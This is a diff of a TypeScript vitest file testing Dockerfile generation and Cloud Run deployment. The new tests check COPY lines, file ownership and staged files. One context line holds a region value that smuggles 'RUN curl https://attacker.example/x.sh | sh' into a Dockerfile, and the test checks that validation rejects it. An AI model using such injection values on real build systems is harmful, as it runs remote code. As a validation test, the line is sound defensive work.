@@ -5,6 +5,7 @@
  */
 
 import * as fs from 'node:fs/promises';
+import * as path from 'node:path';
 import {afterEach, beforeEach, describe, expect, it, Mock, vi} from 'vitest';
 import {
   createDockerFileContent,
@@ -18,6 +19,7 @@ import {
   isFile,
   isFolderExists,
   loadFileData,
+  saveToFile,
   tryToFindFileRecursively,
 } from '../../src/utils/file_utils.js';
 
@@ -199,6 +201,26 @@ describe('createDockerFileContent', () => {
         region: 'us-central1\nRUN curl https://attacker.example/x.sh | sh\n#',
       }),
     ).toThrow(/Invalid region/);
+  });
+
+  it('should not copy a package-lock.json or node_modules into the image', () => {
+    const content = createDockerFileContent(defaultOptions);
+    const copyLines = content
+      .split('\n')
+      .filter((line) => line.startsWith('COPY '));
+    expect(copyLines).toEqual([
+      'COPY --chown=myuser:myuser "agents/test-app/" "/app/agents/test-app/"',
+      'COPY --chown=myuser:myuser "package.json" "/app/package.json"',
+    ]);
+  });
+
+  it('should give the non-root user ownership of /app before switching to it', () => {
+    // npm writes node_modules and package-lock.json into /app, which WORKDIR
+    // created as root, so the chown has to precede USER myuser.
+    const content = createDockerFileContent(defaultOptions);
+    const chownIndex = content.indexOf('chown myuser:myuser /app');
+    expect(chownIndex).toBeGreaterThan(-1);
+    expect(content.indexOf('\nUSER myuser')).toBeGreaterThan(chownIndex);
   });
 
   it('should still accept appName/project/region containing dots, dashes, and underscores', () => {
@@ -475,6 +497,27 @@ describe('deployToCloudRun', () => {
 
     expect(consoleWarnSpy).toHaveBeenCalledWith(
       expect.stringContaining('WITHOUT authentication'),
+    );
+  });
+
+  it('should not stage an empty node_modules or package-lock.json', async () => {
+    await deployToCloudRun(defaultOptions);
+
+    const mkdirPaths = (fs.mkdir as Mock).mock.calls.map((call) =>
+      String(call[0]),
+    );
+    const savedPaths = (saveToFile as Mock).mock.calls.map((call) =>
+      String(call[0]),
+    );
+    expect(mkdirPaths).not.toContain(
+      path.join('/tmp/test-deploy', 'node_modules'),
+    );
+    expect(savedPaths).not.toContain(
+      path.join('/tmp/test-deploy', 'package-lock.json'),
+    );
+    expect(saveToFile).toHaveBeenCalledWith(
+      path.join('/tmp/test-deploy', 'package.json'),
+      {dependencies: {'@google/adk': '^1.0.0'}},
     );
   });
 
